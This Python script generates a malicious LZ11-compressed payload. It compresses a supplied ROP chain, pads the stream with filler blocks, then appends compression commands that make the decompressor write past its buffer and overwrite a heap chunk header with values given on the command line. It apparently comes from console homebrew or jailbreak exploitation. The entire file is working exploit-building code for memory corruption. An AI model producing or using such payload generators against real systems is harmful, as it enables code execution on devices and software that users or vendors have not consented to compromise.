import compress
import struct
import math
import sys

def compressionBlock(l, d):
	d -= 1
	if l > 0x10 or l <= 0x01:
		raise Exception("can't do compression block with size "+hex(l))
	if d < 0 or d > 0xfff:
		raise Exception("can't do compression block with displacement "+hex(d))
	l -= 0x1
	return [(l<<4|(d>>8)), (d&0xFF)]

def compressionBlockExtended(l, d):
	d -= 1
	if l > 0x110 or l < 0x11:
		raise Exception("can't do extended compression block with size "+hex(l))
	if d < 0 or d > 0xfff:
		raise Exception("can't do extended compression block with displacement "+hex(d))
	l -= 0x11
	return [(0<<4|(l>>4)), (((l&0xF)<<4)|(d>>8)), (d&0xFF)]

def compressionBlockExtraExtended(l, d):
	d -= 1
	if l > 0x10110 or l < 0x111:
		raise Exception("can't do extra extended compression block with size "+hex(l))
	if d < 0 or d > 0xfff:
		raise Exception("can't do extra extended compression block with displacement "+hex(d))
	l -= 0x111
	return [(1<<4|(l>>12)), (l>>4)&0xFF, (((l&0xF)<<4)|(d>>8)), (d&0xFF)]

def superBlock(b):
	if len(b)!=8:
		raise Exception("need exactly 8 blocks, not "+str(len(b)))
	out = [0x00]
	for i, v in enumerate(b):
		if isinstance(v, list):
			# compression block !
			out[0] |= 1<<(7-i)
			out += v
		else:
			# regular data block
			out += [v]
	return out

def superBlockFill(b):
	while len(b)<8:
		b += [0x00]
	return superBlock(b)

ropdata_fn = sys.argv[1]
payload_fn = sys.argv[2] if len(sys.argv)>=3 else "payload.bin"
shuffle_flag = int(sys.argv[7]) if len(sys.argv)>=8 else 0


cmdfunc = [compressionBlock, compressionBlockExtended, compressionBlockExtraExtended]
cmdlen = [0x2, 0x3, 0x4]
minlen = [0x2, 0x11, 0x111]
# cut as much of a from compression block of type t with length l
def cutAsMuch(t, l, a):
	d = min(l - minlen[t], a)
	return (a - d, l - d)

# data which will be written right after the buffer
if len(sys.argv)>=7:
	val = [int(v,0) for v in sys.argv[3:3+4]]
	data = struct.pack("<IIII",val[0],val[1],val[2],val[3])
	overwriteData = list(data)
else:
	overwriteData = [0x68, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x69, 0x20, 0x61, 0x6D, 0x20, 0x64, 0x61, 0x74, 0x61, 0x2E]

# out = [0x11, 0x00, 0x00, 0x30]
rop_data = bytearray(open(ropdata_fn,"rb").read())
ropDecompSize = len(rop_data) + compress.compress_nlz11(rop_data, open("tmp","wb"))
out = list(bytearray(open("tmp", "rb").read()))

# start by generating the end data so we know how much room we have to fill later on
endStuff = []
if shuffle_flag==0:
	# first write data over already-processed compressed blob
	endStuff += superBlock(overwriteData[:8])
	endStuff += superBlock(overwriteData[8:])
	# then copy it a few times to overwrite the memchunk header
	endStuff += superBlock([compressionBlockExtraExtended(0x1000, 0x10), 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
	fillAmount = 0x2a0000 - len(endStuff)
else:
	fillAmount = 0x150000 - len(endStuff)

print(["0x%02X"%v for v in endStuff])

# filler data
filler = []
filler += superBlock([0xDA]*8)
fillProgress = 8
fillList = []
while fillProgress < fillAmount:
	fillRemaining = fillAmount - fillProgress
	if fillRemaining > 0xffff+0x111:
		fillList += [(2, 0xffff+0x111)]
		fillProgress += 0xffff+0x111
	elif fillRemaining > 0xff+0x11:
		fillList += [(2, fillRemaining)]
		fillProgress += fillRemaining
	elif fillRemaining > 0xf+0x1:
		fillList += [(1, fillRemaining)]
		fillProgress += fillRemaining
	else:
		fillList += [(0, fillRemaining)]
		fillProgress += fillRemaining

fillCmdLength = sum([cmdlen[t] for (t, _) in fillList])
fillCmdLength += int(math.floor(float(len(fillList)-1)/8))+1 #headers
fillCmdLength += 8-(len(fillList)%8) #end 00s
fillCmdLength += 9 #start DAs

cutLength = fillCmdLength+ropDecompSize
dataOffset = 8+(8-(len(fillList)%8))

for i in range(0, 0x150000-fillCmdLength-len(endStuff)-len(out)-9, 9):
	out += superBlockFill([])
	cutLength += 8
	dataOffset += 8

# cut filler length
for i in range(len(fillList)):
	cutLength, l = cutAsMuch(fillList[i][0], fillList[i][1], cutLength)
	fillList[i] = (fillList[i][0], l)

dataOffset += ropDecompSize+sum([v[1] for v in fillList])
print(hex(dataOffset))

# generate actual filler lz data
fillList = [cmdfunc[t](l, 8) for (t, l) in fillList]
for i in range(0, len(fillList), 8):
	l = min(8, len(fillList)-i)
	filler += superBlockFill(fillList[i:i+l])

print(fillCmdLength)
print(fillList)

print(["0x%02X"%v for v in filler])

# adjust endStuff for offset
adjustment = 0x10-(dataOffset%0x10)
if adjustment <= 8:
	overwriteData[:] = (overwriteData[-adjustment:]+overwriteData[:(8-adjustment)]) + (overwriteData[(8-adjustment):(16-adjustment)])
else:
	adjustment = 16 - adjustment
	print(adjustment)
	overwriteData[:] = (overwriteData[(adjustment):(adjustment+8)]) + (overwriteData[-(8-adjustment):]+overwriteData[:adjustment])
if shuffle_flag==0:
	endStuff[0:9] = superBlock(overwriteData[:8])
	endStuff[9:18] = superBlock(overwriteData[8:])

# output file
out += filler
out += endStuff

if shuffle_flag==1:
	if len(out) > 0x150000:
		raise Exception("The generated payload prior to adding the footer is already too large.")
	while len(out) < 0x150000:
		out += [0x00]
	out += overwriteData

if shuffle_flag==0:
	dataOffset+= 0x1010

totalLength = dataOffset
out[1] = totalLength&0xFF
out[2] = (totalLength>>8)&0xFF
out[3] = (totalLength>>16)&0xFF

open(payload_fn, 'wb').write(bytearray(out))
